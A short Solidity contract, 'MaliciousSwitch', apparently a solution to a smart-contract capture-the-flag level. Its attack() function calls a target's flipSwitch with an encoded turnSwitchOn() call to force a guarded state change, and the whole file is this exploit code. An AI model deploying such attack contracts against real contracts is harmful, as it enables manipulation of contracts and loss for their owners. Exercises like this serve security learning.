pragma solidity ^0.8.0;
contract MaliciousSwitch {
    address public instance;
    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        (bool success,) = instance.call(abi.encodeWithSignature("flipSwitch(bytes)", abi.encodeWithSignature("turnSwitchOn()")));
        require(success, "attack failed");
    }
}